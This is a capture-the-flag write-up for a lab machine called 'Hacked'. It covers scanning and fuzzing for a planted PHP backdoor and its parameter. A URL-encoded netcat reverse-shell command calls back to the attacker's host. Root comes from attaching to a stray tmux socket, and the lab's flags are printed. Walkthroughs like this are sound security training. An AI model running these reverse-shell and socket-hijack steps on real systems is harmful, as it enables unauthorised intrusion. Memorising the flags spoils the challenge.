***Difficulty: `Hard`***  
***Remote Target: `10.0.0.22`***

# 1. Reconnaissance

    root@kali ~/D/M/Hacked# nmap -sS -A -p- -T4 10.0.0.22

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 8d:75:44:05:5f:f8:4f:ac:a1:33:fa:84:03:db:6f:94 (RSA)
    |   256 5a:b6:c6:9d:a9:15:42:74:4c:7a:f9:dd:67:ae:75:0e (ECDSA)
    |_  256 05:97:3c:74:bd:cf:8d:80:87:05:26:64:7f:d9:3d:c3 (ED25519)
    80/tcp open  http    nginx 1.14.2
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: nginx/1.14.2

Let's start by enumerating the HTTP service.

![image](https://user-images.githubusercontent.com/76552238/185964125-bc73edad-4023-4b8f-800a-5f623e2fcf82.png)

**'h4x0r'** might be a possible user on the remote machine, let's continue enumerating the web server and see what use it has to us.

    root@kali ~/D/M/Hacked# gobuster dir -u http://10.0.0.22/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,html,php

    /index.html           (Status: 200) [Size: 16]
    /robots.txt           (Status: 200) [Size: 16]

Let's view the **'robots.txt'** file.

![image](https://user-images.githubusercontent.com/76552238/185970345-f882df98-e772-4f86-bc69-cb6894dc524c.png) 

### **secretnote.txt:**

    [X] Enumeration
    [X] Exploitation
    [X] Privesc
    [X] Maintaining Access.
    |__> Webshell installed.
    |__> Root shell created.

    -h4x0r

Since we didn't find anything on the first scan, let's try a different wordlist.

    root@kali ~/D/M/Hacked# gobuster dir -u http://10.0.0.22/ -w /usr/share/wordlists/SecLists/Web-Shells/backdoor_list.txt -x txt,html,php

    /simple-backdoor.php  (Status: 302) [Size: 62] [--> /]
    /simple-backdoor.php  (Status: 302) [Size: 62] [--> /]
    /index.html           (Status: 200) [Size: 16]        
    /index.html           (Status: 200) [Size: 16] 

Going to **http://10.0.0.22/simple-backdoor.php** we are redirected to the root directory of the web server. Let's use **'Burp Suite'** to see what the is going on. 

![image](https://user-images.githubusercontent.com/76552238/185980175-a3fb21de-c094-4214-8924-2380f3a5cfea.png)

Let's use **'wfuzz'** to find the parameter.

    root@kali ~/D/M/Hacked# wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.0.0.22/simple-backdoor.php?FUZZ=cat --help' --hh 62

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000190:   302        1 L      18 W       121 Ch      "secret"   

# 2. Exploitation

The web server is vulnerable to RCE, let's run on the remote machine and get a reverse shell on our local machine.

Using **Burp Suite** we can encode our payload as a URL send it to to the remote machine.

![image](https://user-images.githubusercontent.com/76552238/185985812-446c2ef5-7fff-429b-bcd7-ec813b6cd28d.png)

    Remote Machine:

    root@kali ~/D/M/Hacked# curl 'http://10.0.0.22/simple-backdoor.php?secret=%6e%63%20%31%30%2e%30%2e%30%2e%32%37%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68'

    Local Machine: 

    root@kali ~/D/M/Hacked# nc -lnvp 4444
    listening on [any] 4444 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.22] 35294
    id -a
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 3. Privilege Escalation

    www-data@hacked:/home$ pwd
    /home
    www-data@hacked:/home$ ls -l
    total 4
    drwxr-xr-x 2 h4x0r h4x0r 4096 Nov 15  2020 h4x0r

The user **'h4x0r'** is on the remote machine.

Running **[LinPeas][1]** on the remote machine something interesting popped up.

![image](https://user-images.githubusercontent.com/76552238/185992341-598ef04b-c6f3-43f0-ac18-89c2f0cc3ca6.png)

Viewing the file /tmp/.hacked it is socket.

    www-data@hacked:/tmp$ file .hacked
    file .hacked
    .hacked: socket

Tmux

    www-data@hacked:/$  export TERM=xterm
    www-data@hacked:/$  tmux -S /tmp/.hacked

    # id -a
    uid=0(root) gid=0(root) groups=0(root)

    # cat user.txt
    HMVimthabesthacker

    # cat /root/root.txt
    HMVhackingthehacker

[1]: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"